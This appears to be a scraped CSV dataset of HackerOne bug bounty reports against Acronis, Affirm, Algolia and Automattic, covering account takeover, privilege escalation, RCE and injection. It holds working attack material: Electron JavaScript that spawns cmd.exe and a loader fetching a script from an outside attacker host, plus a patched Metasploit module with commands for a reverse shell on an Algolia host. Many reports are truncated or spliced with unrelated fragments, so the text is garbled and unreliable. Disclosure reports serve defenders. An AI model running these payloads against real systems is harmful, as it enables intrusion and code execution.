Acronis,1001-5000,0.0,1m-10m,$337.00,Medium,5.45,Violation of Secure Design Principles, Account Takeover on unverified emails in File Sync & Share ,"0xcrypto  submitted a report to Acronis.Jun 24th (2 years ago)Summary
The name change functionality in File Sync & Share is expected to change the name in File Sync & Share. But the API endpoint used in it also allows changing email to any email without having to verify the email. The login email stays the same but the email within File Sync & Share application changes to the new email without verification. This allows user to pretend to be someone else. If the victim has not verified his email, the bug can allow attacker to take over his File Sync & Share account.
Steps to Reproduce

Given the attacker has user access to the File Sync & Share, Login (as attacker) at https://mc-beta-cloud.acronis.com/fc/access.
In the dashboard of File Sync & Share ie. https://mc-beta-cloud.acronis.com/fc/access#/nodes, click on right top Profile button and click on your name. A modal should open which allows you to change the name.

After the modal box appears, you can see that the email field is disabled. To change it, click on save while capturing the request in any proxy like Burpsuite. The request should look like:

Code 50 BytesWrap lines Copy Download1{""name"":""Human Resource"",""email"":""hr@acronis.com""}
If you get email already taken, the email has been already verified by the user and account takeover is not possible. So try any other email.
If you get 204 No Content the email has been changed successfully and account takeover is successful.
To verify if email has been changed or not, you can go to https://mc-beta-cloud.acronis.com/fc/access#/log within your account.
This does not changes the email ID for the main profile but only File Sync & Share ie. the attacker can login using the old credentials but the new Email is shown everywhere within the File Sync & Share.
I tested the folder/file sharing feature after taking over the account and found that the email used to login can no longer be invited and the email changed using this method is now available to be invited. While the invites goes in the new email, the account is controlled by the attacker.
If the administrator tries to check the email, the taken over email is not reflected in Management Control Dashboard. If the victim verifies his email after the takeover and tries to access File Sync & Share, he gets the error This account has not been created yet but his account gets verified.

So the attack is quite stealth.
I haven't tested other applications and whether this taken over email is reflected in other places or not. But I suspect that it gets reflected in other applications as well.
Impact
The attacker could trick the users by pretending to be anyone. Also, the attacker could steal important files by taking over unverified accounts.2 attachments:F880834: Screenshot_2020-06-24_16-53-03.pngF880837: Screenshot_2020-06-24_16-58-38.png0xcrypto   posted a comment. Jun 24th (2 years ago)A small correction. If the administrator has already created an account for the victim, it cannot be claimed as the api will give ""has already been taken"" error message. So the bug is for unclaimed emails ie. the email addresses not having any account. But if the victim's account is created after the attacker can claimed the email, the account gets created within the Management Console. The victim will get his account created but visting any application will result in ""This account has not been created yet"" error message. So it is like claiming email without verification, but leads to account takeover if the adminstrator creates account with the same email.0xcrypto   posted a comment. Jun 25th (2 years ago)I am also able to modify any field if the field name is known. For example, I was able to change locale using the following request on the same endpoint.

Could you please clarify, how is it possible to takeover the account? As far as I can see it is not possible to change email for another user.
My steps:

Change email in Files Sync & Share as you described
Go to Management Console and create another account with email address from previous step
Activate account and open File Sync & Share

In File Sync & Share there is an error ""This account has not been created yet"".
So the only possible impact I see is that user registered with the same email will not be able to access File Sync & Share.0xcrypto   changed the status to New. Updated Jun 25th (2 years ago)Hi, @stushieva,
The user will not be able to access File Sync & Share but it gets severe when someone tries to share file to the victim's claimed email.
Try sharing a file to the attacker's first account. You will find that attacker's login email is no longer acceptable in the share feature. But if you try to share the file to the victim's email, file gets shared, an email is sent to the victim's account but the file shows up in the attacker's account.
If you look from the administrator's perspective, the claimed email still belongs to the victim within the admin's dashboard. Also, if the victim tries to verify his email, his account gets marked as verified and shows up within the admin's dashboard as well. So if the admin is not aware of victim's account being locked out, the administrator or any other user may end up sharing files or folders with the victim's account which is in control of the attacker.
So it is kinda account takeover as the account which was meant to belong to the victim now belongs to the attacker.stushieva Acronis staff  updated the severity from high to low. Jun 26th (2 years ago)stushieva Acronis staff  changed the status to Triaged. Jun 26th (2 years ago)Thanks for clarification.
Your report passed initial review and passed to the security team. We will be back to you soon.0xcrypto   posted a comment. Jun 26th (2 years ago)Hi @stushieva,
I think the severity of this bug should not be low as it is also possible to take over accounts outside an organization as well. For example, an attacker can buy the Acronis service and create as many users as he wants and later claim another organization's email addresses ie by brute forcing the endpoint, the attacker could easily claim common email addresses of victim organization. Since the victim organization can create and even verify accounts for such claimed email, the victim may think his locked account is a technical issue and others may keep sharing files and folders without knowing.
Kindly reassess the vulnerability and update the severity accordingly.stushieva Acronis staff  posted a comment. Jul 1st (2 years ago)@0xcrypto,
After internal discussion we decided, that this is Medium severity issue.
As per your last comment, attacker will need to have an account in that organization (tenant in terms of Acronis Cyber Cloud). Otherwise, attacker will not have access to files shared by victim organization users and users of the organization will have normal access to File Sync & Share.

Acronis,1001-5000,0.0,1m-10m,$100.00,Low,2.0,Information Disclosure,[acronis.secure.force.com] - Insecure Salesforce default/custom object permissions leads to information disclosure,"amsda  submitted a report to Acronis.Oct 31st (2 years ago)Hi there,
I know that this domain https://acronis.secure.force.com is not listed in scope but I thought it would be a good idea to share this finding with you because this endpoint is leaking internal information/meetings.
Target: The Salesforce instance at https://acronis.secure.force.com.
Description: The web application at https://acronis.secure.force.com is built using Salesforce. Salesforce is a CRM for developing web applications providing a number of abstractions to simplify the development of data-driven applications. In particular, the Aura framework enables developers to build applications using reusable components exposing an API in order for the components to interact with the application.
During testing it was discovered that the Salesforce instance has loose permissions on the Event object for unauthenticated Guest users.
Therefore, a malicious attacker may be able to extract sensitive information belonging to other users of the application. To do this, an unauthenticated attacker may craft a HTTP request directly to the Aura API at https://acronis.secure.force.com/acc/aura, using built-in controller methods normally used by the Salesforce Lightning components.
Steps to Reproduce:
1) Ensure Burp Suite is sniffing all HTTP(S) requests in the background;
2) Navigate to https://aaroncostello-developer-edition.eu45.force.com, this is to retrieve a template aura request for use;
3) Find a POST request in Burp's Proxy history to the /s/sfsites/aura endpoint;
4) Send it to the repeater;
5) Modify both the Host header and Burp's target field to acronis.secure.force.com
6) Modify the POST request to /acc/aura
7) Change the message POST parameter to the payload below. Please note that all other parameters should remain untouched, and that in this example payload, a pageSize of 100 is used for speed however more records can be retrieved:
Event

8) Submit the request
9) The response contains sensitive information belonging to other users.
Remediation: Enforce record level security (RLS) on the vulnerable object to ensure records are only able to be retrieved by the record owner, and privileged users of the application.
Thank you
Impact
The Salesforce instance does not enforce sufficient authorization checks when specific objects are requested. As such, an unauthenticated attacker may be able to extract sensitive data from the records in these objects which contains information of other users.

The library then tries to load non-existing file: C:\bs_hudson\workspace\mod-openssl-fips-win\205\product\out\standard\vs_2013_release\OpenSSL\ssl\openssl.cnf. The path seems to be hardcoded leftover from compilation.

Because by default any user is able to create directories  on C:\ drive, it is possible to create missing directories and missing file (openssl.cnf). The OpenSSL config file implements support for loading additional DLL modules. Attacker may point to arbitrary DLL which will be loaded by service running with Local System privileges. Once service is restarted (e.g. due to system reboot), the planted library is loaded by the service and arbitrary code is executed. The code would typically add new Administrative user to the Windows system or establish reverse shell connection.
Successful injection of arbitrary library is shown on procmon log:

Steps to reproduce

Create directories: mkdir C:\bs_hudson\workspace\mod-openssl-fips-win\205\product\out\standard\vs_2013_release\OpenSSL\ssl

This vulnerability is critical and can't be tested on production environment as it will break the VPN by deleting any file , so I tested on local environment .
We need to verify that the vulnerability exists :

Firstly I downloaded the vulnerable code and compared it with the code from local environment , and they were identical

Acronis,1001-5000,0.0,1m-10m,$250.00,High,7.9,Privilege Escalation,Local privilege escalation via insecure MSI file,"twvyy3vyaw8k  submitted a report to Acronis.Jan 5th (2 years ago)Summary
I've found a vulnerability which leads to a local privilege escalation starting from a non-admin user.
When True Image client installs it drops 2 MSI files into C:\Windows\Installer folder.
Since this folder (by default) is readable by anyone, a non-admin user can execute commands like msiexec /fa installer_name.msi, which forces installer_name.msi to ""repair"" the program.
One of these 2 MSIs (i can't named it because MSI file names are random and unique for every installation) when forced to repair it creates a dll in %TEMP%\random_name and then, after some time, MsiExec.exe loads it. Since MsiExec.exe auto-escalate privileges when executed and %TEMP% is writable by anyone, this behavior could be abused to gain nt authority\system privileges.
Steps To Reproduce

Open %TEMP% and C:\Windows\Installer
Locate the MSI file in the installer folder: it's 1.3 GB large and has Acronis as author 
Open cmd.exe and execute msiexec /fa C:\Windows\Installer\installer_name.msi.  After few seconds a new folder will appear in %TEMP%
Replace schedule.dll inside that folder with the schedule.dll attachment  in this report
Wait until the process finishes. After some time a UAC should prompt, just select ""no""
A new cmd should pop up. Type whoami to confirm the new privileges

I've also recorded a PoC video in case something it's not clear.
Recommendations
Do not use local %TEMP% to create schedule.dll, use C:\Windows\TEMP.

Remediation
Rate limiting could be one of the fundamental solutions by limiting the number of the wrong OTP a user can submit.
The fundamental problem here is not that OTP is possible for Bruteforce, but the lack of token expiry generated for login purpose.
Luckily, there is a better way for this. When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.
Once this is set to expiry, then to make another consecutive request to the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN would be automatically invalid. This should be done without even checking OTP to prevent brute-forcing. The login token generation on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/ should be limited.

[Broken access control is the method of controlling which users can perform a certain type of action or view set of data. Broken access control is a vulnerability that allows an attacker to circumvent those controls and perform more actions than they are allowed to, or view content they typically don’t have access to. Such vulnerability, when exploited, could lead to massive loss of data.]
Steps To Reproduce:
Navigate to https://razer.com and purchase something
Now select the option to use “Affirm” as a financing option
Look for the POST parameter of /api/██████/ and the request will inform you of the “checkout_ari”:“XXXXXXXXXXXXXXXX” generated for that specific purchase.
Forward this Request to the repeater, then change the value “checkout_ari”:“XXXXXXXXXXXXXXXX” to “checkout_ari”:“YYYYYYYYYYYYYYYYY” and the back-end will return the requested order with all the user’s purchase information from his full address, means payments, and products.

  Remediation Recommendations
Implement proper access control measures around data sets and functions. Ensure that only authorized users are able to view data or perform the functions they are intended. Implement object-based access controls. This will ensure that users who circumvent UI restrictions are still restricted from retrieving any sensitive data or perform restricted actions without proper authorization. Please review the OWASP foundations recommendations for more specific details on Broken Access Control.

While testing I noticed a DNS entry for ███████.████.██████████.com is CNAME ████.███████████ which's TLD is not registered yet and also not reserved for using Internal DNS Domain Name . As a result, an attacker can register for the ███ TLD to create and takeover ███████.████████.█████.com subdomain.

Take a look at CNAME value what is ████.████████████. domain which TLD is ████ what is not registered yet. So it's available to register and buy the domain.
You can check already registered TLD's from this list: http://data.iana.org/TLD/tlds-alpha-by-domain.txt

Supporting Material/References:
And Internal used reserved domains TLD are

.test
.example
.invalid
.localhost

Impact
An attacker can register for ████████ TLD to take over the target subdomain by buying ██████████ domain and create █████.███████ subdomain to serve content on █████.█████████.█████████.com subdomain, which can lead to malicious attacks against users. Users will see this as a valid domain of Affirm and they may share their sensitive information with an attacker.

Hi there, assuming you want this report as your policy mentions Affirm resources with third-parties, but the scope was a little unclear. Regardless, www█████.affirm.com points to an AWS S3 bucket affirm-prod-www-cms█████████ that no longer exists. I was able to take control of this bucket and put my own content onto it. I can now serve content on this domain, obtain a TLS certificate for this domain, etc.
If any customers or servers are pointing to anything within this domain, I could serve them arbitrary/malicious content. I could also use this in case your domain whitelists your own domain for OAuth, or if there are cookies scoped to the entire domain. Usually this can have a high impact.
Note: S3 has a weird quirk where the bucket's region may cause errors if a request to a bucket is addressed to the wrong region. I assume your CDN points to ████-2, but my bucket is in us-east-1. When you make a request to this domain, S3 shows a redirect error because of this. If I wanted to move the bucket to the correct region (for the PoC to fully work), it would put it at risk of being claimed by attackers/others. Hopefully, this is enough for you.

Algolia,501-1000,0.0,1m-10m,$100.00,Medium,5.45,Information Disclosure,An “algobot”-s GitHub access token was leaked,"sainaen  submitted a report to Algolia.Mar 9th (6 years ago)An access token of algobot account was first leaked 2015-12-02 in this Travis CI job log of instantsearch.js project due to incorrect handling of output from command git clone (or a ghpages module to be more specific.) Since then, the configuration of that project seems to have been changed not to perform this operation (last build with token found is from 2016-01-06), but the docsearch project still uses it and leaks algobot's token with every build of the master branch, here's for example the latest one.
This token has a public_repo scope, so it gives commit access to any public repositories its owner has access to. So both instantsearch.js and docsearch are affected.
You may want to verify that there were no suspicious changes since the first leak. Unfortunately I didn't find any way to check the token usage history, so cannot help with that.
Note that I did use this token to get its owner info (GET call to endpoint https://api.github.com/user) and repositories that belong to them (GET call to https://api.github.com/user/repos), but I didn't attempt to perform any other operations.
Also, please be sure to avoid disclosing this issue accidentally (e.g. in commit messages), as I'm still working with others that have similar leaks. Revoking/rotating tokens without explanation with simple “updating the token” should be fine though, generally nobody pays attention to them.",https://hackerone.com/reports/212067,California,United States,San Francisco,2017,3,9,20,27

A user can change their last name to a URL in order to send email invitations containing malicious hyperlinks.
Steps to Reproduce

Create a new Algolia account with the last name http://example.com.
Navigate to My Account > Referrral
Send an invitation to an email address that you control

You will receive a new email with the last name being a link to a potentially malicious site.
Consequences
This permits users to send malicious/phishing links to potential clients. It could also have an effect on how spam filters treat algolia.com emails.1 attachment:F116299: proof.png",https://hackerone.com/reports/164833,California,United States,San Francisco,2016,8,31,20,8
Algolia,501-1000,0.0,1m-10m,$300.00,Medium,5.45,Information Disclosure,Information disclosure -> 2fa bypass -> POST exploitation,"akashhamal0x01  submitted a report to Algolia.Jul 23rd (about 1 year ago)Greetings!
So i was testing algolia.com. Impressed to find out that there are mitigations in place to prevent POST exploitation such as : 
When 2fa is enabled we need ""old password""  to update following things : 

To update the password
To disable the 2fa, etc (might more more....)

And we need 2fa codes to do following actions : 

To change email
To download recovery codes 
To delete account, etc (might be more...)

So given these security checks, even if an account is compromised ( attacker don't know password or have access to 2fa or anything but only access to account)
For example, just consider a scene that the victim is  using your website in cyber cafe and forgets to for example logout.
So the attacker will check all functionalities to make victims account his/her but provided that he/she needs to have either access to 2fa or know password then he/she will be helpless. So now attacker starts to find vulnerabilities in website!
So here i found that the ""gauth_secret"" is potentially leaked in response (which is not normal and is unnecesarry to leak), which means that the attacker who got access to the account can take advantage of this information leakage , use that ""gauth_secret"" value in authenticator app and then bypass the checks by providing the correct codes!
So this way an attacker can bypass authentication and execute critical actions like :

updating mail , deleting acc , etc

Steps to reproduction :
first login into algolia.com and then 

Go to ""https://www.algolia.com/account/support"" 
There will be 2 buttons : ""Revoke"" and ""Renew"", click on ""Renew"" and intercept that request using proxy like burp suite
Now  send that request to repeater and forward that request
In repeater, replay the request and check response and look for ""gauth_secret"" and then copy the value of that key
download google authenticator app and then paste it , then it will show the codes
Now u can execute actions as you know the 2fa codes now!

Impact
Since there are checks implemented for every critical action , i think the leakage of ""gauth_secret"" here let attacker bypass those checks by knowing 2fa
So now the attacker can delete account, update email and do much more critical actions and totally compromise victims account
Solution : Don't leak the gauth_secret in response",https://hackerone.com/reports/1276373,California,United States,San Francisco,2021,7,23,18,33

Algolia,501-1000,0.0,1m-10m,$500.00,No value,0.0,Code Injection,RCE on facebooksearch.algolia.com,"michiel  submitted a report to Algolia.Apr 25th (7 years ago)While doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a public GitHub repository. Since the Rails app running at facebooksearch.algolia.com is using CookieStore as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.
Cookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: https://charlie.bz/blog/rails-3.2.10-remote-code-execution. 
Where did I find the session secret?
I used Gitrob to scan all of Algolia's public repositories (plus repositories from employees) and extract everything that is interesting. The secret_token.rb initializer immediately caught my attention since it usually contains the secret_key_base, which should never be public. 
The token can be found here: https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12
Proof of Concept
@joernchen developed a ready to go proof of concept for this vulnerability and submitted it to the Metasploit Framework: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb
Since the version of the exploit doesn't take cookies with - into account, here is a small patch to allow the exploit to work on the _facebook-search_session cookie. Here's the patch for the exploit: 
Code 227 BytesWrap lines Copy Download1     if res && !res.get_cookies.empty?
2-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
3+      match = res.get_cookies.match(/([_A-Za-z0-9\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
4     end
With that patch applied, you can run the PoC from msfconsole by following these commands:
Code 309 BytesWrap lines Copy Download1# setting up
2use exploit/multi/http/rails_secret_deserialization
3set secret ""<grab-from-github-url>""
4set rhost facebooksearch.algolia.com
5set railsversion 4
6set targeturi /auth/facebook
7
8# and then run
9exploit
10
11# when successful, a reverse shell will be established
12# this allows you to run arbitrary commands
As a proof of concept, I ran id:
Code 50 BytesWrap lines Copy Download1id
2uid=1000(prod) gid=1000(prod) groups=1000(prod)
But since that is very generic, I also created http://facebooksearch.algolia.com/hackerone.txt with the text ""PoC by michiel"" to proof regular write access is possible as well. 
Remediation
Switch config/initializers/secret_token.rb to use an environment variable (e.g. ENV['SECRET_KEY_BASE']). You must also generate a new token because the current secret is compromised. A new secret can be generated by running rake secret from the command line. Make sure the new secret does not leak in git commit history.",https://hackerone.com/reports/134321,California,United States,San Francisco,2016,4,25,5,47

Hi team
Hope you are good
Missing proper authorization checks on the vulnerable request allows an attacker to approve/decline afk of users on the behalf of other user who is a member of other organization. This can be exploited simply by changing the responder_user_id in the vulnerable request.
Platform(s) Affected:
[Happy tools / Website]
Steps To Reproduce:

Create two accounts for happy tools and login into two different browsers say accounts 1 and 2 and browser A and B.
Configure browser A with burp proxy
Put an AFK request.
Go to https://schedule.happy.tools/afk and click on approve or decline and capture the request in burp.
Now replace the value of responder_user_id with the user id of account 2.
Valid response is shown.

Supporting Material/References:

Automattic,1001-5000,0.0,50m-100m,$250.00,High,7.95,Code Injection,[Simplenote for Windows] Client RCE via External JavaScript Inclusion leveraging Electron,"ysx  submitted a report to Automattic.Nov 18th (5 years ago)Hi,
A carefully crafted injection in the Markdown parser within Simplenote for Windows can be leveraged to achieve remote code execution via an external JavaScript file. 
The nature of Simplenote's content sharing system, which makes use of tags containing email addresses, means that an adversary could distribute the following proof of concept en-masse to achieve targeted arbitrary code execution, simply requiring the target to ""preview"" the Markdown-formatted note.
Steps to reproduce
Prerequisites
A standard remote web server can be used to create a functional proof of concept. For the purposes of this demonstration, please consider ysx.bz the ""adversary"" server.
Create a new JavaScript file (herein referred to as hackerone-electron.js) in the root directory, such that the path would read: http://ysx.bz/hackerone-electron.js.
External JavaScript file
To prepare our exploit, populate this file with the following JavaScript code:
Code 534 BytesWrap lines Copy Download1write(""<h1>Simplenote RCE via Electron - Windows - ysx</h1>"");
2write(""<h3>Proof of concept in progress: popping <pre>netplwiz</pre>. Please stand by!</h3>"");
3var Process = process.binding('process_wrap').Process;
4var proc = new Process();
5proc.onexit = function(a,b) {};
6var env = process.env;
7var env_ = [];
8for (var key in env) env_.push(key+'='+env[key]);
9proc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
Encoding and exploitation
Next, please open a JavaScript eval encoder and encode the following payload, modifying the JavaScript source URL as appropriate. This will be used within an <img> tag as part of the crafted note.
Code 150 BytesWrap lines Copy Download1var js = document.createElement('script'); js.type = 'text/javascript'; js.src = 'http://ysx.bz/hackerone-electron.js'; document.body.appendChild(js);
The above example should encode as follows:

Automattic,1001-5000,0.0,50m-100m,$100.00,Low,2.0,Business Logic Errors,Ability to subscribe to inactive Post+ creators,"ajoekerr  submitted a report to Automattic.Aug 28th (about 1 year ago)Hey y'all! 👋 Hope all is well!
Summary:
In testing Tumblr's Post+, I've found that it's possible to subscribe to creators that, at one point, opted into Post+ but had opted out after some point. As I note later on, it appears that this is a ""one time use only"" as the Payment URL becomes invalid after activating Post+ for the inactive Post+ blog.
Platform(s) Affected:
N/A
Steps To Reproduce:
In order to reproduce, you need the blogMembershipsId of an inactive Post+ blog. This creates a high bar to actually exploit this but, for some reason, I had the blogMembershipsId of ███████, who had deactivated Post+ shortly after launch (the membership ID is █████).

Get an active Post+ subscription URL (I used ██████.tumblr.com's subscription URL).
Replace the active Post+ blog's blogMemershipsId with the inactive blog's blogMembershipsId (if using ███████, you should have a url like https://███.payment.tumblr.com/checkout/?token=<token>).

As a heads up, it actually looks like this URL is no longer valid after activating my Post+ subscription for █████████.


Complete checkout as normal.
After checkout, it will redirect back to the active Post+ blog's creator page but it will never load.
Verify that the creator page for the previously inactive Post+ blog is active again and that the subscription is active for the inactive Post+ blog.

Supporting Material/References:
Unfortunately, this looks like a ""one time use"" only vulnerability as the WooCommerce payment URL is no longer active for ██████ after I attempted to subscribe so I was unable to get a PoC video. However, I've uploaded the receipt in case having the payment_intent ID helps at all!
Impact
As of right now, the only impact I've been able to see is that the inactive Post+ blog's creator page became active, even without them enrolled into Post+: https://www.tumblr.com/creator/█████. However, I would also consider the fact that a page would show the blog name & avatar for the Post+ blog noted in the token but the checkout URL corresponds to the blogMembershipsId as unexpected behavior but, as far as I can tell, it would be somewhat of a ""self-pwn"" 😅.
If y'all don't necessarily consider this a security risk, please let me know and I will self-close this report! To be honest, with what I can see, I consider this to be fairly low impact but I wanted to let y'all know anyway. 🙂xknown Automattic staff  posted a comment. Aug 30th (about 1 year ago)Hi @ajoekerr!

Akismet is vulnerable to CSRF allowing an attacker to cancel accounts of victims, add sites, remove subscriptions, etc.
Steps to reproduce Account cancelation


Login to your Akismet account, which has a subscription activated.


The following POST request will cancel the subscription and the account:

The 1 can be replaced with any number. The userid was originally there, but I noticed that it actually just gets ignored.
Steps to reproduce other CSRF

http://en.instagram-brand.com/register/reset/<the security token here>?email=<email address here>
Description and Impact
The password reset links issues by Instagram Brand gets delivered to users inbox with a http scheme and NOT https scheme.
This causes an attacker stealing those links and performing mass account takeovers and security compromises.
The link that gets delivered in inbox is:
http://mandrillapp.com/track/click/30956340/instagram-brand.com?p=<the very long security token here>
On requesting the above link in browser, it sends back the password reset token in clear text: http://en.instagram-brand.com/register/reset/<the security token here>?email=<the email of user here>
Solution:
This issues has a very easy solution. I have myself performed this and it worked !!.
Whenever the code responsible for sending password reset link makes those links, just add https as scheme instead of http. And you will observe that now all the accounts are safe and data cannot be stolen.
Reproduction Instructions / Proof of Concept

Request for you password reset link.
Go to inbox.
Right click that link and paste it on notepad and observe the scheme.
You can also start Wireshark to capture the traffic and observe that security token can be compromised.

I have attached the screenshot of Wireshark as a proof of concept. InstagramBrandMITM.png (F161119)2 attachments:F161119: InstagramBrandMITM.pngF161120: InstagramBrandMITM.pcapng",https://hackerone.com/reports/206650,California,United States,San Francisco,2017,2,15,15,12
Automattic,1001-5000,0.0,50m-100m,$350.00,High,7.95,Deserialization of Untrusted Data,Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce,"simonscannell  submitted a report to Automattic.Aug 30th (4 years ago)This vulnerability is based on the following exploitation technique:
https://blog.ripstech.com/2018/new-php-exploitation-technique/
It is easier to explain this vulnerability by having watched the PoC first:
https://www.youtube.com/watch?v=mr3bAOIUwd4
Here is what's happening:

Since a valid phar file needs o be uploaded to the server (the extension doesn't matter) I upload the poc.jpg via the media uploader
I begin the Import process with a valid CSV file
The importer asks if I am sure that I want to run the import on these files
I confirm and modify the  POST parameter to my phar:// wrapper and deserialize the file
The PHP code executes

The source of the vulnerability within the source code lies in the /woocommerce/includes/import/class-wc-product-csv-importer.php:
Code 1.55 KiBWrap lines Copy Download1	public function __construct( $file, $params = array() ) {
2		$default_args = array(
3			'start_pos'        => 0, // File pointer start.
4			'end_pos'          => -1, // File pointer end.
5			'lines'            => -1, // Max lines to read.
6			'mapping'          => array(), // Column mapping. csv_heading => schema_heading.
7			'parse'            => false, // Whether to sanitize and format data.
8			'update_existing'  => false, // Whether to update existing items.
9			'delimiter'        => ',', // CSV delimiter.
10			'prevent_timeouts' => true, // Check memory and time usage and abort if reaching limit.
11			'enclosure'        => '""', // The character used to wrap text in the CSV.
12			'escape'           => ""\0"", // PHP uses '\' as the default escape character. This is not RFC-4180 compliant. This disables the escape character.
13		);
14
15		$this->params = wp_parse_args( $params, $default_args );
16		$this->file   = $file;
17
18		if ( isset( $this->params['mapping']['from'], $this->params['mapping']['to'] ) ) {
19			$this->params['mapping'] = array_combine( $this->params['mapping']['from'], $this->params['mapping']['to'] );
20		}
21
22		$this->read_file();
23	}
24
25	/**
26	 * Read file.
27	 */
28	protected function read_file() {
29		$handle = fopen( $this->file, 'r' ); // @codingStandardsIgnoreLine.
30
31		if ( false !== $handle ) {
32			$this->raw_keys = version_compare( PHP_VERSION, '5.3', '>=' ) ? fgetcsv( $handle, 0, $this->params['delimiter'], $this->params['enclosure'], $this->params['escape'] ) : fgetcsv( $handle, 0, $this->params['delimiter'], $this->params['enclosure'] ); // @codingStandardsIgnoreLine
33
34...
As can be seen, the constructor calls read_file, which in turn calls fopen without any checks, which leads to the deserialization of the Phar object.
I recommend to check the file parameter and see if it actually is a CSV file before calling fopen on it.
I have attached the poc.jpg that worked for my PHP version.
Impact
I only displayed the contents of the /etc/passwd file in the PoC video. However, since I can execute arbitrary PHP code, a complete compromise of the WordPress installation is possible. If an attacker can gain access to a Shop manager account, he can easily and without restrictions take over the server.1 attachment:F340061: poc.jpg",https://hackerone.com/reports/403083,California,United States,San Francisco,2018,8,30,16,37

Check your CPU usage in task manager. It would go to 99% as shown in attached.
This happens since these pages continues to send unlimited requests to https://pixel.wp.com/g.gif?v=wpcom-no-pv&x_newdash_pageviews=route&t=0.1642450245826501

Working POC for open redirect

Access wordpress using url https://wordpress.com/wp-login.php?redirect_to=https%3A%2F%2Fgoogle.com%2Fsearch?q=myFakeSite&reauth=1
After login you will be redirected to https://www.google.co.in/search?q=myFakeSite&gws_rd=cr&ei=WLYGV8fUHIq8uATj56uIBA which is incorrect. Wordpress should not allow redirecting to external websites like google,yahoo.

A more convincing PoC would probably consist of playing around CSS to make the app look like it has crashed and then prompt the user to login in again.
Mitigation
Since Simplenote is built on Electron I would imagine it should be easy to implement a Content Security Policy and you should be able to set the frame-src directive to none. This can be achieved by adding the following meta element in the index.html file: 
Code 71 BytesWrap lines Copy Download1<meta http-equiv=""Content-Security-Policy"" content=""frame-src 'none';"">
On top of that, I would suggest looking into implementing a fully-fledged CSP to prevent similar attacks and to reduce the impact of XSS.1 attachment:F240841: Sign_in_to_Simplenote_001.pngxknown Automattic staff  posted a comment. Nov 20th (5 years ago)Hi.

Automattic,1001-5000,0.0,50m-100m,$75.00,No value,0.0,None,CSV Injection in polldaddy.com,"strukt  submitted a report to Automattic.Oct 4th (7 years ago)Hello,
We can inject commands in any fields of a member in an email group (=2*10 for example), and when it's exported to CSV it will be evaluated to 20 in the corresponding cell, this enables an attacker to spread malware and execute system level commands on a victim's machine if the victim downloaded the CSV file.
Steps to reproduce:
1-  Create an email group and name it anything.
2- Add a member with =210 in their firstname, lastname, and custom data.
3- Export as CSV and open in Excel or any similar program, the evaluated value will replace the =210 expression.

Automattic,1001-5000,0.0,50m-100m,"$1,337.00",No value,0.0,Code Injection,WordPress SOME bug in plupload.flash.swf leading to RCE,"cure53  submitted a report to Automattic.Apr 26th (7 years ago)Intro
WordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file plupload.flash.swf. The code in the file attempts to remove flashVars ¹ in case they have been set GET parameters but fails to do so, enabling XSS via ExternalInterface ².
The attack technique was first described by Soroush Dalili in 2013 ³. The vulnerability in plupload.flash.swf was discovered in April 2016, first identified as SOME⁴ bug by Kinugawa. Then, after a team review, the XSS potential was discovered and analyzed by Heiderich, Kinugawa and Inführ. Finally, it was discovered, that this file comes packaged with latest WordPress and the issue was reported here by Heiderich et al.
Simple PoC:
http://example.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert&uid%g=hello&
A more complex PoC was created to demonstrate the potential Remote Code Execution attack (RCE) of this vulnerability. A detailed description thereof can be found below.
Code 493 BytesWrap lines Copy Download1<button onclick=""fire()"">Click</button>
2<script>
3function fire() {

6}
7</script>
Background
The majority of background information as to why this kind of attack works and how the protective mechanisms installed in the SWF can be bypassed was already explained in depth in this bug report:
https://hackerone.com/bugs?subject=user&report_id=134546
This section will therefore describe the SOME bug in more detail and omit the basics on why the attack works as they are identical to the ones in the other ticket. Now, let's get specific with this bug's details.
Similar to the affected file in the linked report, Plupload employs the so called “GET Killer”:
Code 316 BytesWrap lines Copy Download1params = root.loaderInfo.parameters;
2pos = root.loaderInfo.url.indexOf('?');
3if (pos !== -1) {
4    query = Utils.parseStr(root.loaderInfo.url.substr(pos + 1));        
5    
6    for (var key:String in params) {    
7        if (query.hasOwnProperty(Utils.trim(key))) {
8            delete params[key];
9        }
10    }
11}
From: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/Moxie.as#L70
The string parsing is done in a different ActionScript file:
Code 497 BytesWrap lines Copy Download1static public function parseStr (str:String) : Object {
2    var hash:Object = {},
3        arr1:Array, arr2:Array;
4    
5    str = unescape(str).replace(/\+/g, "" "");
6    
7    arr1 = str.split('&');
8    if (!arr1.length) {
9        return {};
10    }
11    
12    for (var i:uint = 0, length:uint = arr1.length; i < length; i++) {
13        arr2 = arr1[i].split('=');
14        if (!arr2.length) {
15            continue;
16        }
17        hash[Utils.trim(arr2[0])] = Utils.trim(arr2[1]);
18    }
19    return hash;
20}
From: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/mxi/Utils.as#L102
The sanitization in this file is done quite well and strict enough to prohibit XSS attacks. An attacker can however select a different type of attack, also known as SOME or Reverse Clickjacking.
The affected code can be found here:
Code 289 BytesWrap lines Copy Download1private function _fireEvent(evt:*, obj:* = null):void {
2    try {
3        ExternalInterface.call(eventDispatcher, evt, obj);
4    } catch(err:*) {
